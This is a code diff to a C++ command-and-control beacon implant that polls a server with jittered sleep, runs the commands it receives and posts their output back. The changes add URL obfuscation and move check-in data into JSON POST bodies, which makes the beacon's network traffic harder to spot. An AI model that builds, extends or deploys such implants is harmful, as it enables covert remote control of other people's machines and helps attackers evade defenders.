@@ -9,6 +9,7 @@
 #include <ctime>
 
 #include "config.h"
+#include "urlObfuscation.h"
 
 #ifdef __unix__
 #define OS "Linux"
@@ -25,10 +26,6 @@
 #include "../Windows/Beacon/beacon_commands.h"
 #endif
 
-
-std::string constructUrl() {
-    return URL + "/beacon?id=" + ID;
-}
 
 int calculateSleepTime(int timer, int jitter) {
     int sign = (rand() % 2 == 0) ? 1 : -1;
@@ -124,10 +121,16 @@ std::tuple<int, std::string> postRequest(const std::string& url, const std::stri
 std::tuple<int, std::string, int> httpConnection(const std::string& address) {
     std::string hostname = "client";
     std::vector<std::string> ipAddresses = getIPAddresses();
-    std::string connectURL = URL + "/connection?name=" + hostname + "&os=" + OS + "&address=127.0.0.1";
+    std::string connectURL = generateConnectionURL();
+    Json::Value requestData;
+    requestData["name"] = hostname;
+    requestData["os"] = OS;
+    requestData["address"] = "127.0.0.1";
     std::cout << "Request URL: " << connectURL << std::endl;
 
-    auto [response_code, response_body, response_url] = getRequest(connectURL);
+    std::tuple<int, std::string> postResult = postRequest(connectURL, requestData.toStyledString());
+    int response_code = std::get<0>(postResult);
+    std::string response_body = std::get<1>(postResult);
     if (response_code == -1) {
         return std::make_tuple(-1, "", -1);
     }
@@ -163,10 +166,13 @@ std::tuple<int, std::string, int> httpReconnect(const std::string& address, cons
     std::string hostname = "client";
     std::vector<std::string> ipAddresses = getIPAddresses();
 
-    std::string reconnectURL = URL + "/reconnect?name=" + hostname + "&os=" + OS + "&address=127.0.0.1&id=" + user_id + "&timer=" + std::to_string(timer) + "&jitter=" + std::to_string(jitter);
+    std::string reconnectURL = generateReconnectURL();
+    Json::Value requestData;
+    requestData["name"] = hostname;
+    requestData["os"] = OS;
+    requestData["address"] = "127.0.0.1"; // tmp value
     std::cout << "Request URL: " << reconnectURL << std::endl;
-
-    auto [response_code, response_body, response_url] = getRequest(reconnectURL);
+    auto [response_code, response_body] = postRequest(reconnectURL, requestData.toStyledString());
     if (response_code == -1) {
         return std::make_tuple(-1, "", -1);
     }
@@ -202,9 +208,11 @@ bool handleResponse(const std::string& response_body, int& timer, const std::str
             std::string output = command_handler(command, command_uuid);
             Json::Value json_data;
             json_data["output"] = output;
+            json_data["command_uuid"] = command_uuid;
             Json::StreamWriterBuilder writer;
             std::string json_string = Json::writeString(writer, json_data);
-            postRequest(URL + "/response?id=" + ID + "&cid=" + command_uuid, json_string);
+            std::string responseURL = generateResponse();
+            postRequest(responseURL, json_string);
         } else {
             return false;
         }
@@ -229,11 +237,11 @@ bool handleResponse(const std::string& response_body, int& timer, const std::str
 int beacon() {
     srand(time(0));
     while (true) {
-        std::string beaconURL = constructUrl();
+        std::string beaconURL = generateBeaconURL();
         std::cout << "Request URL: " << beaconURL << std::endl;
 
         int sleepTime = calculateSleepTime(TIMER, JITTER);
-
+        
         auto [response_code, response_body, response_url] = getRequest(beaconURL);
         if (response_code == -1) {
             int result = retryRequest(beaconURL, 5, sleepTime);
